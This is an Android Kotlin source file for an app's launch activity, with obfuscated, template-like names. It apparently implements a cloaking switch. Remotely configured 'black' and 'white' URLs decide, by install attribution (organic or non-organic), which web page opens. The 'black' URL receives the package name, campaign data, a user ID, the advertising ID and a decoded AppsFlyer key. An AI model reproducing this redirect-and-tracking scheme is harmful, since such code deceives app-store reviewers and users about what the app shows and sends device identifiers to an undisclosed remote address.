package com.pasa.parimca.appp

import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.transition.ChangeBounds
import android.transition.Scene
import android.transition.TransitionManager
import android.widget.ProgressBar
import androidx.core.app.ActivityOptionsCompat
import androidx.lifecycle.lifecycleScope
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.pasa.parimca.appp.Utilities2oh7ld.*
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity2oh7ld : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main_2oh7ld)
        getSharedPreferences("SP_2oh7ld", MODE_PRIVATE).getString("Last_Page_2oh7ld", null)?.let {
            startActivity(Intent(this, WebActivity2oh7ld::class.java))
            finish()
        }
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(
                mapOf(
                    FB_BLACK_KEY_2oh7ld to "empty"
                )
            )
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    fbBlackValue2oh7ld = getString(FB_BLACK_KEY_2oh7ld)
                    fbDefaultValue2oh7ld = getString(FB_DEFAULT_KEY_2oh7ld)
                    fbWhiteValue2oh7ld = getString(FB_WHITE_KEY_2oh7ld)
                }
            }
        }
        clickSetup2oh7ld {
            it.isClickable = false
            TransitionManager.go(
                Scene.getSceneForLayout(
                    findViewById(R.id.cl_2oh7ld),
                    R.layout.scene_main_2oh7ld,
                    this
                ),
                ChangeBounds()
            )
            lifecycleScope.launch {
                delay(100)
                animationBackGround2oh7ld()
                for (i2oh7ld in 0..100) {
                    findViewById<ProgressBar>(R.id.pb_2oh7ld).progress = i2oh7ld
                    delay(50)
                }
                parsedURL2oh7ld = if (fbBlackValue2oh7ld == null || fbBlackValue2oh7ld == "empty") {
                    fbWhiteValue2oh7ld ?: return@launch
                } else {
                    if (status2oh7ld == "Non-organic") {
                        if (key2oh7ld.toString().length != 20) {
                            Uri.parse(fbBlackValue2oh7ld).buildUpon()
                                .appendQueryParameter("key", fbDefaultValue2oh7ld)
                                .appendQueryParameter("bundle", packageName)
                                .appendQueryParameter("sub4", adGroup2oh7ld)
                                .appendQueryParameter("sub5", adSet22oh7ld)
                                .appendQueryParameter("sub6", afChannel2oh7ld)
                                .appendQueryParameter("sub7", "Default")
                                .toString()
                                .plus(
                                    "&sub10=$uid2oh7ld||$AID2oh7ld||${
                                        CODE_APPSFLYER_2oh7ld.decodeString2oh7ld()
                                    }"
                                )

                        } else {
                            Uri.parse(fbBlackValue2oh7ld).buildUpon()
                                .appendQueryParameter("key", key2oh7ld)
                                .appendQueryParameter("bundle", packageName)
                                .appendQueryParameter("sub2", sub22oh7ld)
                                .appendQueryParameter("sub3", sub32oh7ld)
                                .appendQueryParameter("sub4", adGroup2oh7ld)
                                .appendQueryParameter("sub5", adSet22oh7ld)
                                .appendQueryParameter("sub6", afChannel2oh7ld)
                                .appendQueryParameter("sub7", mediaSource2oh7ld)
                                .toString()
                                .plus(
                                    "&sub10=$uid2oh7ld||$AID2oh7ld||${
                                        CODE_APPSFLYER_2oh7ld.decodeString2oh7ld()
                                    }"
                                )

                        }
                    } else {
                        Uri.parse(fbBlackValue2oh7ld).buildUpon()
                            .appendQueryParameter("key", fbDefaultValue2oh7ld)
                            .appendQueryParameter("bundle", packageName)
                            .appendQueryParameter("sub7", "Organic")
                            .toString()
                            .plus(
                                "&sub10=$uid2oh7ld||$AID2oh7ld||${
                                    CODE_APPSFLYER_2oh7ld.decodeString2oh7ld()
                                }"
                            )

                    }
                }
                startActivity(
                    Intent(this@MainActivity2oh7ld, WebActivity2oh7ld::class.java),
                    ActivityOptionsCompat.makeSceneTransitionAnimation(
                        this@MainActivity2oh7ld,
                        findViewById(R.id.v_2oh7ld),
                        "view_in"
                    )
                        .toBundle()
                )

            }
        }


    }

    override fun onStop() {
        finish()
        super.onStop()
    }

}